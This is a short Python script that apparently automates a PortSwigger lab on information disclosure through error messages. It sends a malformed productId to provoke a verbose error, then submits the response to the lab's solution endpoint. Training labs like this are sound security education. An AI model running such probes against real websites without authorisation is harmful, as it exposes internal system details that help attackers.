import requests

# Lab Url
# https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages

# Enter the url of portswigger instance
host = input('Enter Host without "/" in the end: ')
# the payload endpoint, we are changing the id number into something
payload_endpoint = "/product?productId=\"something\""
response = requests.get(url=host+payload_endpoint)
data = {'answer': response.content}
answer_submition = f"{host}/submitSolution"
requests.post(url=answer_submition, data=data)